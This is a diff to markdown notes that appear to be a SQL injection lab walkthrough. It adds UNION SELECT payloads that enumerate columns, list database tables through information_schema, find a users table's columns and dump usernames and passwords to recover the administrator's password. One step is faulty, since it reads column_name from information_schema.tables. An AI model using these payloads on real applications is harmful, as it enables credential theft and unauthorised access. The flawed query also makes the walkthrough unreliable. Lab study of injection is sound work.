@@ -100,12 +100,24 @@ Follow the same UNION strategy as above
 ```
 ' UNION SELECT NULL--
 ' UNION SELECT NULL,NULL--
+' UNION SELECT 'abc',NULL--
+' UNION SELECT NULL,'abc'--
 ```
 
+Then we need to pull data on the tables in the db
 
+```
+' UNION SELECT table_name, NULL FROM information_schema.tables--
+```
 
+Use the table you can deduce contains user creds
 
+```
+' UNION SELECT column_name, NULL FROM information_schema.tables WHERE table_name='users_abcdef'--
+```
 
+Then pull out the administrator pass with this:
 
-
-
+```
+' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
+```
